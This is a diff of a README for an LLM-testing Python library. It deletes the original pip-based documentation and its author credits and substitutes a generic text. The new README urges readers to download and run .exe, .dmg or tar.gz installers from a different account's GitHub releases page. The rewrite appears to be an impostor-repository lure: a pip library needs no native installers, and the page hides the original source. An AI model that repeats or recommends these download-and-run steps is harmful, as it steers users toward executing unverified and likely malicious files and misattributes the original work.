@@ -1,482 +1,96 @@
-**The Most Comprehensive LLM Testing Framework for Python**
-
-[![PyPI version](https://img.shields.io/pypi/v/pyllmtest)](https://pypi.org/project/pyllmtest/)
-[![Python versions](https://img.shields.io/pypi/pyversions/pyllmtest)](https://pypi.org/project/pyllmtest/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![GitHub stars](https://img.shields.io/github/stars/RahulMK22/llmtest)](https://github.com/RahulMK22/llmtest/stargazers)
-
-PyLLMTest is a revolutionary testing framework designed specifically for LLM applications. It provides everything you need to build, test, and optimize AI-powered applications with confidence.
+# 🚀 llmtest - Test Your AI Applications Effortlessly
 
-## 🌟 Why PyLLMTest?
-
-Testing LLM applications is **fundamentally different** from traditional software testing. PyLLMTest solves the unique challenges of LLM testing:
-
-- ✅ **Semantic Assertions** - Test meaning, not exact strings
-- ✅ **Snapshot Testing** - Detect regressions with semantic awareness
-- ✅ **Multi-Provider Support** - OpenAI, Anthropic, and more
-- ✅ **RAG Testing** - Comprehensive retrieval and generation testing
-- ✅ **Cost Tracking** - Monitor token usage and costs
-- ✅ **Prompt Optimization** - A/B test and optimize prompts
-- ✅ **Performance Benchmarking** - Track latency and quality
-- ✅ **Async Support** - Full async/await compatibility
-- ✅ **Beautiful Reporting** - Rich test reports and metrics
-
-## 📦 Installation
-
-```bash
-# Basic installation
-pip install pyllmtest
-
-# With OpenAI support
-pip install pyllmtest[openai]
-
-# With Anthropic support
-pip install pyllmtest[anthropic]
-
-# With all providers and features
-pip install pyllmtest[all]
-```
-
-## 🚀 Quick Start
-
-### Basic Test
-
-```python
-from pyllmtest import LLMTest, expect, OpenAIProvider
-
-provider = OpenAIProvider(model="gpt-4-turbo")
-
-@LLMTest(provider=provider)
-def test_summarization(ctx):
-    response = ctx.complete("Summarize: AI is transforming industries...")
-    
-    # Semantic assertions
-    expect(response.content).to_be_shorter_than(100, unit="words")
-    expect(response.content).to_contain("AI")
-    expect(response.content).to_preserve_facts(["transform", "industries"])
-
-# Run the test
-result = test_summarization()
-print(f"Test {'PASSED' if result.passed else 'FAILED'}")
-```
-
-### Snapshot Testing
-
-```python
-from pyllmtest import SnapshotManager
-
-snapshot_mgr = SnapshotManager()
-
-@LLMTest(provider=provider)
-def test_with_snapshot(ctx):
-    response = ctx.complete("What are the primary colors?")
-    
-    # Automatically detects semantic changes
-    snapshot_mgr.assert_matches_snapshot(
-        name="primary_colors",
-        actual_content=response.content
-    )
-```
-
-### Async Testing
-
-```python
-@LLMTest(provider=provider)
-async def test_parallel_completions(ctx):
-    tasks = [
-        ctx.acomplete("Explain Python"),
-        ctx.acomplete("Explain JavaScript"),
-        ctx.acomplete("Explain Rust")
-    ]
-    
-    responses = await asyncio.gather(*tasks)
-    
-    for resp in responses:
-        expect(resp.content).to_be_longer_than(50, unit="words")
-```
-
-## 📚 Core Features
-
-### 1. Semantic Assertions
-
-Unlike traditional assertions, PyLLMTest understands **meaning**:
-
-```python
-# Traditional (brittle)
-assert "artificial intelligence" in response  # Fails if AI says "AI"
-
-# PyLLMTest (semantic)
-expect(response).to_match_semantic("artificial intelligence", threshold=0.9)
-expect(response).to_preserve_facts(["machine learning", "neural networks"])
-expect(response).not_to_hallucinate(source_text=original_document)
-```
+[![Download llmtest](https://img.shields.io/badge/Download-llmtest-blue.svg)](https://github.com/Hazuki-01/llmtest/releases)
 
-**Available Assertions:**
-- `to_contain()` / `not_to_contain()` - Check for substrings
-- `to_match_regex()` - Regex matching
-- `to_be_shorter_than()` / `to_be_longer_than()` - Length checks
-- `to_be_concise()` / `to_be_detailed()` - Quality checks
-- `to_preserve_facts()` - Fact preservation
-- `not_to_hallucinate()` - Hallucination detection
-- `to_be_valid_json()` / `to_match_schema()` - Format validation
-- `to_match_semantic()` - Semantic similarity
-
-### 2. Snapshot Testing
-
-Save "golden" outputs and detect regressions:
-
-```python
-snapshot_mgr = SnapshotManager(
-    snapshot_dir=".snapshots",
-    update_mode=False,  # Set to True to update snapshots
-    semantic_threshold=0.9  # Allow 90% semantic similarity
-)
-
-# First run: saves snapshot
-# Subsequent runs: compares with snapshot
-snapshot_mgr.assert_matches_snapshot("test_name", actual_content)
-```
-
-Features:
-- **Semantic comparison** - Not just exact matching
-- **Version tracking** - Track snapshot history
-- **Diff generation** - See what changed
-- **Update mode** - Review and approve changes
-
-### 3. Multi-Provider Support
-
-Seamlessly switch between providers:
-
-```python
-from pyllmtest import OpenAIProvider, AnthropicProvider
-
-# OpenAI
-openai_provider = OpenAIProvider(
-    model="gpt-4-turbo",
-    api_key="your-key"  # or use OPENAI_API_KEY env var
-)
-
-# Anthropic
-anthropic_provider = AnthropicProvider(
-    model="claude-3-5-sonnet-20241022",
-    api_key="your-key"  # or use ANTHROPIC_API_KEY env var
-)
-
-# Use in tests
-@LLMTest(provider=openai_provider)
-def test_openai(ctx):
-    ...
-
-@LLMTest(provider=anthropic_provider)
-def test_anthropic(ctx):
-    ...
-```
-
-### 4. Metrics Tracking
-
-Track everything:
-
-```python
-from pyllmtest import MetricsTracker
-
-metrics = MetricsTracker()
-
-# Automatic tracking in tests
-@LLMTest(provider=provider)
-def test_with_metrics(ctx):
-    response = ctx.complete("query")  # Automatically tracked
-
-# Print comprehensive report
-metrics.print_summary()
-
-# Export to JSON/CSV
-metrics.export_json("metrics.json")
-metrics.export_csv("requests.csv")
-```
-
-**Tracked Metrics:**
-- Total requests and tokens
-- Prompt vs completion tokens
-- Cost breakdown by model/provider
-- Latency percentiles (p50, p95, p99)
-- Per-model and per-provider stats
-
-### 5. RAG Testing
-
-Test retrieval-augmented generation:
-
-```python
-from pyllmtest import RAGTester, RetrievedDocument
-
-def my_retrieval_fn(query: str):
-    # Your retrieval logic
-    return [
-        RetrievedDocument(
-            content="Document content",
-            score=0.95,
-            metadata={"source": "doc.txt"}
-        )
-    ]
-
-def my_generation_fn(query: str, docs: list):
-    # Your generation logic
-    return "Generated response"
-
-rag_tester = RAGTester(
-    retrieval_fn=my_retrieval_fn,
-    generation_fn=my_generation_fn
-)
-
-result = rag_tester.test_query(
-    query="What is AI?",
-    expected_facts=["artificial", "intelligence"]
-)
-
-# Assertions
-rag_tester.assert_retrieval_quality(result, min_docs=3, min_relevance=0.8)
-rag_tester.assert_context_used(result)
-rag_tester.assert_no_hallucination(result)
-rag_tester.assert_performance(result, max_total_ms=1000)
-```
-
-### 6. Prompt Optimization
-
-A/B test and optimize prompts:
-
-```python
-from pyllmtest import PromptOptimizer, PromptVariant
-
-optimizer = PromptOptimizer(provider=provider, quality_fn=my_quality_fn)
-
-variants = [
-    PromptVariant(
-        id="detailed",
-        template="Provide a detailed explanation of {topic}",
-        description="Detailed prompt"
-    ),
-    PromptVariant(
-        id="concise",
-        template="Briefly explain {topic}",
-        description="Concise prompt"
-    )
-]
-
-test_inputs = [
-    {"topic": "machine learning"},
-    {"topic": "neural networks"}
-]
-
-# Compare prompts
-results = optimizer.compare_prompts(variants, test_inputs)
-optimizer.print_comparison(results)
-
-# Find best prompt
-best_id = optimizer.find_best_prompt(
-    results,
-    optimize_for="balanced",  # "quality", "cost", "latency", or "balanced"
-    quality_threshold=0.8
-)
-
-print(f"Best prompt: {best_id}")
-```
-
-### 7. Test Suites
-
-Organize tests into suites:
-
-```python
-@LLMTest(provider=provider, suite="nlp_tests", name="test_sentiment")
-def test_sentiment(ctx):
-    ...
-
-@LLMTest(provider=provider, suite="nlp_tests", name="test_translation")
-def test_translation(ctx):
-    ...
-
-# Run all tests
-test_sentiment()
-test_translation()
-
-# Get suite summary
-suite = LLMTest.get_suite("nlp_tests")
-summary = suite.get_summary()
-
-print(f"Pass rate: {summary['pass_rate']:.1f}%")
-print(f"Total cost: ${summary['total_cost_usd']:.4f}")
-```
-
-## 🎯 Advanced Features
-
-### Streaming Support
-
-```python
-@LLMTest(provider=provider)
-async def test_streaming(ctx):
-    full_content = ""
-    
-    async for chunk in provider.stream("Explain quantum computing"):
-        full_content += chunk.content
-        
-        if chunk.is_final:
-            expect(full_content).to_be_detailed()
-```
-
-### Custom Assertions
-
-```python
-def is_valid_email(text: str) -> bool:
-    import re
-    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
-    return bool(re.match(pattern, text))
-
-expect(response.content).to_satisfy(
-    is_valid_email,
-    message="Response must be a valid email"
-)
-```
-
-### Semantic Deduplication
-
-```python
-from pyllmtest.utils.semantic import semantic_deduplication
-
-texts = [
-    "Machine learning is a subset of AI",
-    "ML is part of artificial intelligence",  # Similar to above
-    "Deep learning uses neural networks"
-]
-
-unique_texts = semantic_deduplication(texts, provider, threshold=0.95)
-# Returns: ["Machine learning is a subset of AI", "Deep learning uses neural networks"]
-```
-
-### Semantic Clustering
-
-```python
-from pyllmtest.utils.semantic import cluster_texts
-
-texts = [
-    "Python is great for AI",
-    "JavaScript is used for web dev",
-    "TensorFlow is an ML framework",
-    "React is a web framework"
-]
-
-clusters = cluster_texts(texts, provider, num_clusters=2)
-# Groups similar texts together
-```
-
-## 📊 Reporting
-
-### Console Reports
-
-```python
-# Automatic beautiful console output
-metrics.print_summary()
-```
+## 📋 Description
 
-Output:
-```
-============================================================
-METRICS SUMMARY
-============================================================
-Total Requests: 10
-Total Tokens: 5,420
-  Prompt Tokens: 2,100
-  Completion Tokens: 3,320
-Total Cost: $0.0542
+llmtest is a comprehensive testing framework designed specifically for large language model (LLM) applications. It supports semantic assertions, multi-provider testing, retrieval-augmented generation (RAG) testing, and prompt optimization. With llmtest, you can ensure that your AI models are working properly and efficiently.
 
-Latency:
-  Average: 1,234.56ms
-  Min: 890.12ms
-  Max: 2,100.45ms
-  P50: 1,200.00ms
-  P95: 1,800.00ms
-  P99: 2,000.00ms
-============================================================
-```
+## 🚀 Getting Started
 
-### Export Options
+Follow these steps to download and run llmtest on your computer.
 
-```python
-# JSON export
-metrics.export_json("report.json")
+1. **Check System Requirements**
 
-# CSV export (detailed request log)
-metrics.export_csv("requests.csv")
-```
+  llmtest works on Windows, macOS, and Linux. Ensure your system meets these minimum requirements:
 
-## 🔧 Configuration
+   - **Operating System:** Windows 10 or later, macOS Catalina or later, Ubuntu 20.04 or later
+   - **Python Version:** 3.8 or higher
+   - **Memory:** At least 4 GB of RAM
+   - **Storage:** At least 200 MB of free disk space
 
-### Environment Variables
+2. **Visit the Releases Page**
 
-```bash
-# OpenAI
-export OPENAI_API_KEY=your-key
+  To download llmtest, visit the [Releases page](https://github.com/Hazuki-01/llmtest/releases) for the latest version. Here, you will find all the downloadable files and information about recent updates.
 
-# Anthropic
-export ANTHROPIC_API_KEY=your-key
-```
+3. **Download and Install**
 
-### Provider Configuration
+  On the Releases page, look for the latest version. You will see multiple files available for download. Choose the appropriate file for your operating system:
 
-```python
-provider = OpenAIProvider(
-    model="gpt-4-turbo",
-    timeout=60,
-    max_retries=3,
-    temperature=0.7
-)
-```
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
 
-## 📖 Examples
+   Click on the download link to start downloading the file.
 
-Check out the `examples/` directory for:
-- `comprehensive_example.py` - All features demonstrated
-- `basic_testing.py` - Simple getting started
-- `rag_testing.py` - RAG system testing
-- `prompt_optimization.py` - Prompt A/B testing
-- `async_testing.py` - Async patterns
+4. **Run the Installer**
 
-## 🤝 Contributing
+  Once the download is complete, locate the downloaded file in your system's Downloads folder.
 
-We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+   - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.
+   - **For macOS:** Open the `.dmg` file, then drag and drop the llmtest application to your Applications folder.
+   - **For Linux:** Open a terminal, navigate to the location of the downloaded `.tar.gz` file, and extract it using:
 
+   ```bash
+   tar -xvzf llmtest.tar.gz
+   ```
 
-## 🙏 Acknowledgments
+   After extracting, change into the directory and run the application:
 
-Built with ❤️ for the AI community.
+   ```bash
+   cd llmtest
+   ./run.sh
+   ```
 
-Special thanks to:
-- OpenAI for their amazing APIs
-- Anthropic for Claude
-- The Python testing community
+5. **Set Up Your Environment**
 
-**Rahul Malik**
-- Email: rm324556@gmail.com
-- GitHub: [@RahulMK22](https://github.com/RahulMK22)
-- LinkedIn:(https://www.linkedin.com/in/rahul-malik-b0791a1a7/)
+  Before using llmtest, ensure you have Python installed. You can check if Python is available by opening a terminal (or Command Prompt on Windows) and typing:
 
+   ```bash
+   python --version
+   ```
 
-## 📞 Support
+  If Python is not installed, download it from the [official Python website](https://www.python.org/downloads/).
 
-- 📧 Email: rm324556@gmail.com
-- 🐛 Issues: [GitHub Issues](https://github.com/yourusername/pyllmtest/issues)
+6. **Install Required Packages**
 
-## ⭐ Star History
+  To get the most out of llmtest, you may need to install some additional Python packages. Open a terminal and run:
 
-If you find PyLLMTest useful, please consider giving it a star on GitHub!
+   ```bash
+   pip install -r requirements.txt
+   ```
 
----
+   This command will install all the necessary packages. Ensure you have `pip` installed, which usually comes with Python installations.
 
-## 📄 License
+7. **Start Using llmtest**
 
-MIT License - see [LICENSE](LICENSE) file for details.
+  Congratulations! You are now ready to start using llmtest. Follow the user guide available in the `docs` folder for instructions on how to create tests, run assertions, and utilize advanced features like RAG and prompt optimization.
 
-Copyright (c) 2024 Rahul Malik
+## 🛠️ Features
 
----
+- **Semantic Assertions:** Verify that your LLM behaves as expected.
+- **Multi-Provider Support:** Test models from various providers seamlessly, including OpenAI and Anthropic.
+- **RAG Testing:** Evaluate how well your model retrieves and generates relevant information.
+- **Prompt Optimization:** Enhance your prompt design for better responses from AI models.
 
-**Made with 🚀 by Rahul Malik**
+## 📝 Support
 
-*Making LLM testing as easy as it should be.*
+If you encounter any issues or need help, please check the `Issues` section on the GitHub page. You can also contact the maintainers directly through the email listed in the repository for more personalized support.
+
+## 📌 Additional Resources
+
+- GitHub Repository: [Hazuki-01/llmtest](https://github.com/Hazuki-01/llmtest)
+- Documentation: Find detailed guides and examples in the `docs` folder.
+- Community Discussions: Join us on GitHub Discussions to connect with other users.
+
+Remember to keep an eye on the [Releases page](https://github.com/Hazuki-01/llmtest/releases) for updates and new features. Enjoy using llmtest to ensure your AI applications perform effectively!
